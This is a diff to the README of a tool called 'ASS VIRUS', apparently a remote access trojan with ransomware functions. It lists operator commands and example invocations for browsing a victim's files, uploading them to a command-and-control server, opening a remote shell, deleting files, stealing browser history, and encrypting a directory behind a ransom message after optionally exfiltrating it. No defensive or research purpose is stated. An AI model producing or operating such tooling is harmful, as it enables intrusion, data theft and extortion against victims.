@@ -1,46 +1,80 @@
-Welcome to the README for ASS VIRUS Here are the available commands:
+The following commands are available:
 
---help : Shows this message.
+- help: shows this message
+- [dir] --walk: walks to the chosen directory
+- --back: walks to the parent directory
+- [file] --read: reads the contents of the file
+- --upload: uploads the file from the victim machine to the CNC
+- --power: makes a shell to execute commands remotely from the CNC
+- --ipconfig: shows the IP configuration
+- --whoami: tells you what the current working directory is
+- --cd| [drive='drive name, for example D:']: change directory
+- [file or dir] --remove: deletes the chosen file or directory
+- --mkdir | [name='folder name, for example TESTFOLDER']: makes a directory
+- --mkfile | [name='file name with extension, for example test.txt']: makes a file
+- [file] --write | [text='text to write', mode='file mode, for example a,wb,w,r,etc.']: writes to a file
+- --browser_history | [browser='browser name, for example brave']: steals the browser's history
+- --ransom | [msg='the ransom message', upload='true to upload files before encrypting or false otherwise']: encrypts all files in the directory and leaves a message for the victim
 
-[dir] --walk : Walks to the chosen directory.
-    Input: dir (string) - the directory to walk to.
+Example usage:
 
---back : Walks to the parent directory.
+- To walk to the directory 'Documents':
+    ```
+    Documents --walk
+    ```
+- To read the contents of the file 'example.txt':
+    ```
+    example.txt --read
+    ```
 
-[file] --read : Reads the contents of the file.
-    Input: file (string) - the file to read.
+- To write the text 'Hello, World!' to the file 'example.txt' in append mode:
+    ```
+    example.txt --write text='Hello, World!' mode='a'
+    ```
 
---upload : Uploads the file from the victim machine to the CNC.
-
---power : Makes a shell to execute commands remotely from the CNC.
-
---ipconfig : Shows the Ipconfig.
-
---whoami : Tells you what the current walking directory is.
-
---cd| [drive='drive name'] : Change directory.
-    Inputs: 
-        - drive (string, optional) - the drive to change to. Default is the current drive.
-
-[file or dir] --remove : Deletes the chosen file or directory.
-    Input: file_or_dir (string) - the file or directory to delete.
-
---mkdir|[name='folder name'] : Makes a directory.
-    Input: name (string) - the name of the new directory.
-
---mkfile|[name='file name'] : Makes a file.
-    Input: name (string) - the name of the new file.
-
-[file] --write|[text='text to write' mode='write mode'] : Writes to a file.
-    Inputs:
-        - file (string) - the file to write to.
-        - text (string) - the text to write to the file.
-        - mode (string) - the write mode to use. Default is 'w'.
-
---browser_history|[browser='browser name'] : Steals the browser's history.
-    Input: browser (string) - the name of the browser to steal history from.
-
---ransom|[msg='ransom message' upload='true/false'] : Encrypts all files in the directory and leaves a message for the victim.
-    Inputs:
-        - msg (string) - the message to display to the victim.
-        - upload (boolean, optional) - whether to upload the files to the CNC before encrypting them. Default is false.
+- To delete the directory or file 'test' in the current directory:
+    ```
+    test --remove
+    ```
+- To return to the parent directory:
+    ```
+    --back
+    ```
+- To upload a file or directory 'Example':
+    ```
+    Example --upload    OR  Example.txt --upload   
+    
+    ```
+- To show the ipconfig in a text editor cnc side:
+    ```
+    --ipconfig
+    ```
+- To change the drive you are in:
+    ```
+    --cd|drive=DRIVE_NAME
+    ```
+- To make a new directory:
+    ```
+    --mkdir|name=DIR_NAME
+    ```
+- To make a new file:
+    ```
+    --mkfile|name=filename.extension
+    ```
+- To see the cwd:
+    ```
+    --whoami
+    ```
+- To steal the browser history and save it in the cnc:
+    ```
+    --browser_history|browser=brave or chrome or edge
+    ```
+- To corrupt all files in the cwd and add a message for the victim as a ransom:
+    ```
+    --ransom|msg=RANSOME_MESSAGE  upload=true or false    
+    uplaod param will send all the files to your cnc before it corrupts it  
+    ```
+-- To see the full commands (not all are listed here):
+    ```
+    --help
+    ```
